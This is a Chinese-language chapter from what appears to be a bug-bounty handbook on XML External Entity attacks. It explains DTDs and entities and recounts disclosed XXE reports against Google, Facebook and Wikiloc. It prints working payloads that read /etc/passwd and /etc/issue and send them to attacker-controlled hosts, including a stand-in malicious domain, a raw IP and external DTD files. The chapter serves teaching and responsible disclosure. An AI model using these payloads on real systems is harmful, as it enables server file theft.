## 第十一章：XML 外部实体**

![图片](img/common.jpg)

攻击者可以利用应用程序解析*可扩展标记语言（XML）*的方式，利用*XML 外部实体（XXE）*漏洞。更具体地说，这涉及利用应用程序处理外部实体在输入中的包含方式。您可以使用 XXE 从服务器中提取信息，或者调用恶意服务器。

### 可扩展标记语言

这种漏洞利用了 XML 中使用的外部实体。XML 是一个*元语言*，意味着它用来描述其他语言。它是为了回应 HTML 的不足而开发的，HTML 只能定义数据如何*显示*。相比之下，XML 定义了数据如何*结构化*。

例如，HTML 可以使用开头标签`<h1>`和闭合标签`</h1>`将文本格式化为标题。（对于某些标签，闭合标签是可选的。）每个标签都有一个预定义的样式，浏览器在渲染网页时会将该样式应用到文本上。例如，`<h1>`标签可能会将所有标题格式化为粗体，字体大小为 14px。同样，`<table>`标签将数据以行和列的形式呈现，`<p>`标签定义了常规段落中文本的显示方式。

相比之下，XML 没有预定义的标签。相反，您自己定义标签，而这些定义不一定包含在 XML 文件中。例如，考虑以下 XML 文件，它呈现了一个职位列表：

```
➊ <?xml version="1.0" encoding="UTF-8"?>

➋ <Jobs>

  ➌ <Job>

    ➍ <Title>Hacker</Title>

    ➎ <Compensation>1000000</Compensation>

    ➏ <Responsibility fundamental="1">Shot web</Responsibility>

     </Job>

   </Jobs>
```

所有标签都是作者定义的，因此仅凭文件本身无法知道这些数据在网页上的显示方式。

第一行➊是一个声明头，指示使用的 XML 1.0 版本和 Unicode 编码类型。初始头部之后，`<Jobs>`标签➋将所有其他`<Job>`标签➌包裹起来。每个`<Job>`标签包裹着`<Title>` ➍、`<Compensation>` ➎和`<Responsibility>` ➏标签。与 HTML 一样，基本的 XML 标签由两个角括号围绕标签名称组成。但与 HTML 中的标签不同，所有 XML 标签都需要闭合标签。此外，每个 XML 标签都可以具有一个属性。例如，`<Responsibility>`标签具有名称`Responsibility`，并且有一个可选属性，由属性名`fundamental`和属性值`1` ➏组成。

#### *文档类型定义*

因为作者可以定义任何标签，所以有效的 XML 文档必须遵循一组通用的 XML 规则（这些超出了本书的范围，但拥有闭合标签是其中一个例子），并且必须与*文档类型定义（DTD）*匹配。XML DTD 是一组声明，定义了哪些元素存在、它们可以拥有哪些属性以及哪些元素可以包含在其他元素内。（*元素*由开头和闭合标签组成，因此`<foo>`是标签，`</foo>`也是标签，但`<foo></foo>`是一个元素。）XML 文件可以使用外部 DTD，或者使用定义在 XML 文档中的内部 DTD。

##### 外部 DTD

外部 DTD 是 XML 文档引用并获取的外部 *.dtd* 文件。以下是之前展示的工作岗位 XML 文档可能对应的外部 DTD 文件示例。

```
➊ <!ELEMENT Jobs (Job)*>

➋ <!ELEMENT Job (Title, Compensation, Responsibility)>

   <!ELEMENT Title ➌(#PCDATA)>

   <!ELEMENT Compensation (#PCDATA)>

   <!ELEMENT Responsibility (#PCDATA)>

   <➍!ATTLIST Responsibility ➎fundamental ➏CDATA ➐"0">
```

XML 文档中使用的每个元素都在 DTD 文件中使用 `!ELEMENT` 关键字进行定义。`Jobs` 的定义表明它可以包含 `Job` 元素。星号表示 `Jobs` 可以包含零个或多个 `Job` 元素。`Job` 元素必须包含 `Title`、`Compensation` 和 `Responsibility` ➋。这些也是元素，并且只能包含可由 HTML 解析的字符数据，用 `(#PCDATA)` 表示 ➌。数据定义 `(#PCDATA)` 告诉解析器每个 XML 标签内将包含什么类型的字符。最后，`Responsibility` 有一个通过 `!ATTLIST` 声明的属性 ➍。该属性名为 ➎，`CDATA` ➏ 告诉解析器该标签仅包含不应解析的字符数据。`Responsibility` 的默认值被定义为 `0` ➐。

外部 DTD 文件在 XML 文档中使用 `<!DOCTYPE>` 元素进行定义：

```
<!DOCTYPE ➊note ➋SYSTEM ➌"jobs.dtd">
```

在这种情况下，我们定义了一个带有 XML 实体 `note` ➊ 的 `<!DOCTYPE>`。XML 实体将在下一节中讲解。但目前，你只需要知道 `SYSTEM` ➋ 是一个关键字，它告诉 XML 解析器获取 *jobs.dtd* 文件 ➌ 的结果，并在 XML 中后续使用 `note` ➊ 时使用该结果。

##### 内部 DTD

还可以将 DTD 包含在 XML 文档内。为此，XML 的第一行也必须是 `<!DOCTYPE>` 元素。通过使用内部 DTD 将 XML 文件与 DTD 结合，我们将得到一个如下所示的文档：

```
➊ <?xml version="1.0" encoding="UTF-8"?>

➋ <!DOCTYPE Jobs [

     <!ELEMENT Jobs (Job)*>

     <!ELEMENT Job (Title, Compensation, Responsibility)>

     <!ELEMENT Title (#PCDATA)>

     <!ELEMENT Compensation (#PCDATA)>

     <!ELEMENT Responsibility (#PCDATA)>

     <!ATTLIST Responsibility fundamental CDATA "0"> ]>

➌ <Jobs>

     <Job>

       <Title>Hacker</Title>

       <Compensation>1000000</Compensation>

       <Responsibility fundamental="1">Shot web</Responsibility>

     </Job>

   </Jobs>
```

这里，我们有一个所谓的 *内部 DTD 声明*。注意，我们仍然以声明头开始，表示我们的文档符合 XML 1.0，并采用 UTF-8 编码 ➊。紧接着，我们定义了 XML 将遵循的 `!DOCTYPE`，这次是通过直接写出整个 DTD，而不是引用外部文件 ➋。其余的 XML 文档跟随 DTD 声明 ➌。

#### *XML 实体*

XML 文档包含 *XML 实体*，它们类似于信息的占位符。再次使用我们之前的 `<Jobs>` 示例，如果我们希望每个职位都包含指向我们网站的链接，反复写地址会很麻烦，尤其是如果我们的 URL 可能会更改时。相反，我们可以使用实体，让解析器在解析时获取 URL 并将其插入到文档中。要创建一个实体，你需要在 `!ENTITY` 标签中声明一个占位符实体名称以及要放入该占位符的信息。在 XML 文档中，实体名称以一个与号（`&`）开头，并以分号（`;`）结尾。当访问 XML 文档时，占位符名称会被标签中声明的值替换。实体名称不仅可以用来替换占位符字符串，它们还可以使用 `SYSTEM` 标签与 URL 一起获取网站或文件的内容。

我们可以更新我们的 XML 文件以包含这一内容：

```
   <?xml version="1.0" encoding="UTF-8"?>

   <!DOCTYPE Jobs [

   --snip--

   <!ATTLIST Responsibility fundamental CDATA "0">

➊ <!ELEMENT Website ANY>

➋ <!ENTITY url SYSTEM "website.txt">

   ]>

   <Jobs>

     <Job>

       <Title>Hacker</Title>

       <Compensation>1000000</Compensation>

       <Responsibility fundamental="1">Shot web</Responsibility>

    ➌ <Website>&url;</Website>

     </Job>

   </Jobs>
```

请注意，我添加了一个`Website !ELEMENT`，但不是使用`(#PCDATA)`，而是使用了`ANY` ➊。这个数据定义意味着`Website`标签可以包含任何可解析数据的组合。我还定义了一个带有`SYSTEM`属性的`!ENTITY`，告诉解析器在`website`标签中的`url`占位符名称处获取*website.txt*文件的内容 ➋。在 ➌ 我使用`website`标签，并且会在`&url;`的位置获取*website.txt*的内容。注意实体名称前面的`&`符号。每当你在 XML 文档中引用一个实体时，必须在其前面加上`&`。

### XXE 攻击是如何工作的

在 XXE 攻击中，攻击者滥用目标应用程序，使其在解析 XML 时包含外部实体。换句话说，应用程序期望接收一些 XML 数据，但并没有验证其接收到的内容；它只是解析任何它收到的东西。例如，假设前面提到的招聘板允许你通过 XML 注册并上传职位信息。

招聘板可能会向你提供其 DTD 文件，并假设你会提交一个符合要求的文件。你可以让`!ENTITY`去获取`"website.txt"`的内容，而不是获取`"/etc/passwd"`的内容。XML 将被解析，服务器文件*/etc/passwd*的内容将被包含在我们的内容中。（*/etc/passwd* 文件最初存储了 Linux 系统上的所有用户名和密码，虽然 Linux 系统现在将密码存储在*/etc/shadow*中，但仍然通常会读取*/etc/passwd*文件来证明漏洞的存在。）

你可能会提交类似这样的内容：

```
   <?xml version="1.0" encoding="UTF-8"?>

➊ <!DOCTYPE foo [

  ➋ <!ELEMENT foo ANY >

  ➌ <!ENTITY xxe SYSTEM "file:///etc/passwd" >

   ]

   >

➍ <foo>&xxe;</foo>
```

解析器接收到这段代码并识别出一个定义了`foo`文档类型的内部 DTD ➊。DTD 告诉解析器，`foo`可以包含任何可解析的数据 ➋；然后有一个实体`xxe`，当文档被解析时，它应该读取我的 */etc/passwd* 文件（*file://*表示指向*/etc/passwd*文件的完整 URI 路径）。解析器应该用这些文件内容替换`&xxe;`元素 ➌。然后，你使用 XML 定义了一个包含`&xxe;`的`<foo>`标签，这将打印出我的服务器信息 ➍。这就是为什么 XXE 如此危险的原因。

但是，等等，还有更多。如果应用程序没有打印响应，只是解析我的内容呢？如果敏感文件的内容从未返回给我，这个漏洞是否仍然有用？好吧，如果不是解析本地文件，你可以像这样联系一个恶意服务器：

```
 <?xml version="1.0" encoding="UTF-8"?>

 <!DOCTYPE foo [

   <!ELEMENT foo ANY >

➊ <!ENTITY % xxe SYSTEM "file:///etc/passwd" >

➋ <!ENTITY callhome SYSTEM ➌"www.malicious.com/?%xxe;">

   ]

 >

 <foo>&callhome;</foo>
```

现在，当 XML 文档被解析时，`callhome`实体 ➋ 会被替换为调用 *www.<恶意>.com/?%xxe* ➌ 的内容。但是 ➌ 需要对`%xxe`进行如 ➊ 所定义的评估。XML 解析器读取 */etc/passwd* 并将其作为参数附加到网址 *www.<恶意>.com/*，从而将文件内容作为 URL 参数 ➌ 发送。因为你控制了那个服务器，你会查看日志，果然，它会包含 */etc/passwd* 的内容。

你可能已经注意到，在`callhome`的 URL 中使用了`%`而不是`&`，`%xxe;` ➊。当实体应该在 DTD 定义中进行评估时，使用`%`；当实体在 XML 文档中评估时，使用`&`。

网站通过禁用外部实体解析来防止 XXE 漏洞。OWASP XML 外部实体防护备忘单（参见 *[`www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)*) 提供了如何为多种语言执行此操作的说明。

### Google 读取访问

**难度：** 中

**网址：** *https://google.com/gadgets/directory?synd=toolbar/*

**来源：** *[`blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/`](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)*

**报告日期：** 2014 年 4 月

**奖励金额：** $10,000

这个 Google 读取访问漏洞利用了 Google 工具栏按钮图库的一个特性，该特性允许开发者通过上传包含元数据的 XML 文件来定义自己的按钮。开发者可以搜索按钮图库，Google 会在搜索结果中显示按钮的描述。

根据 Detectify 团队的说法，当上传一个引用外部文件实体的 XML 文件到图库时，Google 会解析该文件并在按钮搜索结果中渲染内容。

结果，团队利用 XXE 漏洞渲染了服务器的*/etc/passwd*文件内容。至少，这证明恶意用户可以利用 XXE 漏洞读取内部文件。

#### *要点*

即使是大公司也会犯错。无论谁拥有网站，只要网站接受 XML，始终需要测试 XXE 漏洞。读取*/etc/passwd*文件是展示漏洞对公司影响的一个好方法。

### Facebook XXE 与 Microsoft Word

**难度：** 难

**网址：** *[`facebook.com/careers/`](https://facebook.com/careers/)*

**来源：** 攻击安全博客

**报告日期：** 2014 年 4 月

**奖励金额：** $6,300

这个 Facebook XXE 漏洞比之前的示例更具挑战性，因为它涉及远程调用服务器。在 2013 年底，Facebook 修补了 Reginaldo Silva 发现的 XXE 漏洞。Silva 立即向 Facebook 报告了该漏洞，并请求允许将其升级为远程代码执行（这类漏洞在第十二章中介绍）。他认为远程代码执行是可能的，因为他可以读取服务器上的大多数文件，并打开任意的网络连接。Facebook 进行了调查并同意，支付了他$30,000。

结果，Mohamed Ramadan 在 2014 年 4 月挑战自己入侵 Facebook。他原本没想到另一个 XXE 漏洞的可能性，直到他发现 Facebook 的招聘页面，允许用户上传 *.docx* 文件。*.docx* 文件类型只是 XML 文件的一个归档。Ramadan 创建了一个 *.docx* 文件，用 7-Zip 打开提取其内容，并将以下负载插入其中的一个 XML 文件：

```
 <!DOCTYPE root [

➊ <!ENTITY % file SYSTEM "file:///etc/passwd">

➋ <!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">

➌ %dtd;

➍ %send;

 ]>
```

如果目标启用了外部实体，XML 解析器将评估 `%dtd;` ➌ 实体，它会发起到 Ramadan 服务器 *http://197.37.102.90/ext.dtd* ➋ 的远程调用。该调用将返回以下内容，即 *ext.dtd* 文件的内容：

```
➎ <!ENTITY send SYSTEM 'http://197.37.102.90/FACEBOOK-HACKED?%file;'>
```

首先，`%dtd;` 将引用外部的 *ext.dtd* 文件，并使 `%send;` 实体可用 ➎。接着，解析器将解析 `%send;` ➍，这将发起对 `http://197.37.102.90/FACEBOOK-HACKED?%file;` ➎ 的远程调用。`%file;` 引用了 */etc/passwd* 文件 ➊，因此它的内容将替换 HTTP 请求中的 `%file;` ➎。

调用远程 IP 来利用 XXE 并不总是必要的，尽管它在站点解析远程 DTD 文件时很有用，但又阻止访问本地文件的读取。这类似于服务器端请求伪造（SSRF），如在 第十章 中讨论的那样。通过 SSRF，如果站点阻止访问内部地址，但允许调用外部站点并遵循 301 重定向到内部地址，你可以实现类似的结果。

接下来，Ramadan 在他的服务器上启动了一个本地 HTTP 服务器，用 Python 和 SimpleHTTPServer 接收调用和内容：

```
   Last login: Tue Jul 8 09:11:09 on console

➊ Mohamed:~ mohaab007$ sudo python -m SimpleHTTPServer 80

   Password:

➋ Serving HTTP on 0.0.0.0 port 80...

➌ 173.252.71.129 - - [08/Jul/2014 09:21:10] "GET /ext.dtd HTTP/1.0" 200 -

   173.252.71.129 - -[08/Jul/2014 09:21:11] "GET /ext.dtd HTTP/1.0" 200 -

   173.252.71.129 - - [08/Jul/2014 09:21:11] code 404, message File not found

➍ 173.252.71.129 - -[08/Jul/2014 09:21:10] "GET /FACEBOOK-HACKED? HTTP/1.0" 404
```

在 ➊ 处是启动 Python SimpleHTTPServer 的命令，它在 ➋ 处返回消息 `"Serving HTTP on 0.0.0.0 port 80..."`。终端等待，直到接收到对服务器的 HTTP 请求。起初，Ramadan 没有收到响应，但他等待直到最终在 ➌ 收到远程调用以检索 */ext.dtd* 文件。如预期，他随后看到回调到服务器的 */FACEBOOK-HACKED?* ➍，但遗憾的是没有附加 */etc/passwd* 文件的内容。这意味着要么 Ramadan 无法通过这个漏洞读取本地文件，要么 */etc/passwd* 文件不存在。

在继续这个报告之前，我应该补充一点，Ramadan 本可以提交一个不向他的服务器发起远程调用的文件，而是直接尝试读取本地文件。但初步的远程 DTD 文件调用证明了 XXE 漏洞的存在（如果成功），而失败的本地文件读取尝试并不能证明这一点。在这种情况下，由于 Ramadan 记录了 Facebook 向其服务器发出的 HTTP 调用，他可以证明 Facebook 正在解析远程 XML 实体，且即使他无法访问 */etc/passwd*，仍然存在漏洞。

当 Ramadan 报告漏洞时，Facebook 回复要求提供概念验证视频，因为他们无法重现上传过程。之后，在 Ramadan 提供视频后，Facebook 否认了提交的有效性，并表示是某个招聘人员点击了链接，从而发起了请求到他的服务器。经过几封邮件交流后，Facebook 团队继续深入调查，确认漏洞存在并奖励了奖金。与 2013 年初的 XXE 漏洞不同，Ramadan 的 XXE 漏洞无法升级为远程代码执行，因此 Facebook 奖励了较小的奖金。

#### *要点*

这里有几点要注意的内容。XML 文件有不同的格式和大小：留意接受 *.docx*、*.xlsx*、*.pptx* 和其他 XML 文件类型的网站，因为可能有自定义应用程序在解析文件的 XML。最初，Facebook 认为是某个员工点击了一个恶意链接，连接到了 Ramadan 的服务器，这本不算 SSRF。但经过进一步调查，Facebook 确认请求是通过另一种方式发起的。

正如你在其他案例中看到的，有时报告最初会被拒绝。如果你确定漏洞是有效的，那么继续与你报告的公司合作是很重要的，不要放弃解释为什么某个问题可能是漏洞，或者为什么它可能比公司最初评估的更加严重。

### Wikiloc XXE

**难度：** 困难

**网址：** *[`wikiloc.com/`](https://wikiloc.com/)*

**来源：** *[`www.davidsopas.com/wikiloc-xxe-vulnerability/`](https://www.davidsopas.com/wikiloc-xxe-vulnerability/)*

**报告日期：** 2015 年 10 月

**奖励支付：** 礼品

Wikiloc 是一个发现和分享最佳户外徒步、骑行及其他活动路径的网站。它还允许用户通过 XML 文件上传自己的轨迹，这对于像 David Sopas 这样的骑行黑客来说非常有吸引力。

Sopas 注册了 Wikiloc，并在注意到 XML 上传功能后，决定测试其是否存在 XXE 漏洞。首先，他从网站下载了一个文件，以确定 Wikiloc 的 XML 结构，在这个案例中是一个 *.gpx* 文件。然后他修改了文件并上传。这是他修改后的文件：

```
   {linenos=on}

➊ <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://www.davidsopas.com/XXE" > ]>

   <gpx

    version="1.0"

    creator="GPSBabel - http://www.gpsbabel.org"

    xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix

   .com/GPX/1/1/gpx.xsd">

   <time>2015-10-29T12:53:09Z</time>

   <bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000"

   maxlon="-8.037170000"/>

   <trk>

➋ <name>&xxe;</name>

   <trkseg>

   <trkpt lat="40.737758000" lon="-8.093361000">

    <ele>178.000000</ele>

    <time>2009-01-10T14:18:10Z</time>

   --snip--
```

在 ➊，他在文件的第一行添加了一个外部实体定义。在 ➋，他在 *.gpx* 文件中的轨迹名称内调用了该实体。

将文件上传回 Wikiloc 导致向 Sopas 的服务器发出了一个 `HTTP GET` 请求。这个事件有两个值得注意的原因。首先，通过使用一个简单的概念验证调用，Sopas 能够确认服务器正在评估他注入的 XML，并且服务器会进行外部调用。其次，Sopas 使用了现有的 XML 文档，因此他的内容符合该网站预期的结构。

在 Sopas 确认 Wikiloc 会进行外部 HTTP 请求之后，唯一的另一个问题就是它是否会读取本地文件。因此，他修改了自己注入的 XML，使 Wikiloc 将其*/etc/issue*文件的内容发送给他（*/etc/issue*文件会返回所使用的操作系统）：

```
   <!DOCTYPE roottag [

➊ <!ENTITY % file SYSTEM "file:///etc/issue">

➋ <!ENTITY % dtd SYSTEM "http://www.davidsopas.com/poc/xxe.dtd">

➌ %dtd;]>

   <gpx

    version="1.0"

    creator="GPSBabel - http://www.gpsbabel.org"

    xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix

   .com/GPX/1/1/gpx.xsd">

   <time>2015-10-29T12:53:09Z</time>

   <bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000"

   maxlon="-8.037170000"/>

   <trk>

➍ <name>&send;</name>

   --snip--
```

这段代码应该很熟悉。在这里，他使用了位于➊和➋的两个实体，这些实体是通过`%`定义的，因为它们将在 DTD 中被评估。在➌位置，他检索到*xxe.dtd*文件。标签中对`&send;` ➍的引用由返回的*xxe.dtd*文件定义，该文件通过远程调用返回给 Wikiloc ➋。以下是*xxe.dtd*文件：

```
   <?xml version="1.0" encoding="UTF-8"?>

➎ <!ENTITY % all "<!ENTITY send SYSTEM 'http://www.davidsopas.com/XXE?%file;'>">

   ➏ %all;
```

`%all` ➎在位置➍定义了实体`send`。Sopas 的执行方式类似于 Ramadan 对 Facebook 的做法，但有一个微妙的区别：Sopas 试图确保所有可能执行 XXE 的地方都被包括在内。这就是为什么他在内部 DTD 中定义`%dtd;` ➌后立即调用它，并且在外部 DTD 中定义`%all;` ➏后立即调用它。执行的代码位于网站的后端，因此你可能无法确切知道漏洞是如何被执行的。但以下是解析过程的可能样子：

1.  Wikiloc 解析 XML 并评估`%dtd;`，作为对 Sopas 服务器的外部调用。然后 Wikiloc 请求 Sopas 服务器上的*xxe.dtd*文件。

1.  Sopas 的服务器将*xxe.dtd*文件返回给 Wikiloc。

1.  Wikiloc 解析收到的 DTD 文件，这触发了对`%all`的调用。

1.  当`%all`被评估时，它定义了`&send;`，其中包括对实体`%file`的调用。

1.  URL 值中的`%file;`调用被替换为*/etc/issue*文件的内容。

1.  Wikiloc 解析 XML 文档。这会解析`&send;`实体，该实体将被评估为对 Sopas 服务器的远程调用，URL 中的参数为*/etc/issue*文件的内容。

用他自己的话说，游戏结束。

#### *要点*

这是一个很好的例子，展示了你如何利用网站的 XML 模板嵌入自己的 XML 实体，以便文件被目标解析。在这个例子中，Wikiloc 预期接收的是一个*.gpx*文件，而 Sopas 保留了该结构，在预期的标签内插入了自己的 XML 实体。此外，值得注意的是，你如何将恶意的 DTD 文件返回，以便目标对你的服务器发出`GET`请求，将文件内容作为 URL 参数传递。这是一个简便的数据提取方式，因为`GET`参数会在你的服务器上被记录。

### 总结

XXE 代表了一个巨大的攻击向量。你可以通过几种方式完成 XXE 攻击：让易受攻击的应用程序打印其*/etc/passwd*文件，使用*/etc/passwd*文件的内容调用远程服务器，或者请求一个远程 DTD 文件，指示解析器回调到一个服务器并带有*/etc/passwd*文件。

留意文件上传，尤其是那些包含某种形式 XML 的文件。你应该始终测试它们是否存在 XXE 漏洞。
